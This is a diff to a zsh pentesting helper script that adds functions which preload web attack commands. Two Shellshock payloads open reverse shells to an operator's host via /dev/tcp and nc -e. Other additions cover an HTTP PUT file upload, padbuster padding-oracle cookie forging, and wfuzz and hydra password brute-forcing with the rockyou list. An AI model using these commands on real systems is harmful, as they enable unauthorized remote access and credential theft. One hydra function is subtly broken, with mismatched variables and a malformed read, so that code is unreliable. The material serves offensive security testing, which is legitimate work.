@@ -282,6 +282,40 @@ qq-enum-web-vuln-nmap-rfi() {
   print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' -oN web.rfi.nmap ${r}"
 }
 
+qq-enum-web-vuln-shellshock-cookie() {
+  local l && read "l?Local Host: "
+  local port && read "port?Local Port: "
+  print -z "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/${l}/${port} 0>&1"
+}
+
+qq-enum-web-vuln-shellshock-nc() {
+  local l && read "l?Local Host: "
+  local r && read "r?Remote Host: "
+  local port && read "port?Local Port: "
+  print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${l} ${port} -e /bin/bash\"' http://${r}/cgi-bin/status"
+}
+
+qq-enum-web-vuln-put-curl() {
+  local r && read "r?Remote Host: "
+  local f && read "f?File: "
+  print -z "curl -T ${f} http://${r}/${f}"
+}
+
+qq-enum-web-vuln-padbuster-check() {
+  local r && read "r?Remote Host: "
+  local cn && read "cn?Cookie Name: "
+  local cv && read "cv?Cookie Value: "
+  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
+}
+
+qq-enum-web-vuln-padbuster-forge() {
+  local r && read "r?Remote Host: "
+  local cn && read "cn?Cookie Name: "
+  local cv && read "cv?Cookie Value: "
+  local u && read "u?Username: "
+  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${u}"
+}
+
 # apps
 
 qq-enum-web-app-wordpress() {
@@ -315,22 +349,35 @@ qq-enum-web-app-elastic-all() {
   print -z "curl -XGET ${u}:9200/${index}/_search?size=1000 > documents.json"
 }
 
-# padding oracle
+# brute
 
-qq-enum-web-app-padbuster-check() {
+qq-enum-web-brute-wfuzz-auth-post() {
   local r && read "r?Remote Host: "
-  local cn && read "cn?Cookie Name: "
-  local cv && read "cv?Cookie Value: "
-  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
+  local u && read "u?Username field: "
+  local user && read "user?User: "
+  local p && read "p?password field: "
+  local f && read "f?form: "
+  print -z "wfuzz -c -w ${__PASS_ROCKYOU} -d \"${u}=${user}&${p}=FUZZ\" --sc 302 http://${r}/${f}"
 }
 
-qq-enum-web-app-padbuster-forge() {
+qq-enum-web-brute-hydra-get() {
   local r && read "r?Remote Host: "
-  local cn && read "cn?Cookie Name: "
-  local cv && read "cv?Cookie Value: "
+  local user && read "user?Username: "
+  local path && read "path?Path: "
+  print -z "hydra -l ${user} -P ${__PASS_ROCKYOU} ${r} http-get /${path}"
+}
+
+qq-enum-web-brute-hydra-form-post() {
+  local r && read "r?Remote Host: "
   local u && read "u?Username: "
-  print -z "padbuster ${r} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${u}"
+  local path && read "path?Path: "
+  local uf && read "uf?Username Field: "
+  local pf && read "up?Password Field: "
+  local fm && read"fm?Failed Message: "
+  print -z "hydra ${r} http-form-post \"${path}:${uf}=^USER^&${up}=^PASS^:${fm}\" -l $u -P ${__PASS_ROCKYOU} -t 10 -w 30 "
 }
+
+
 
 # Notes 
 
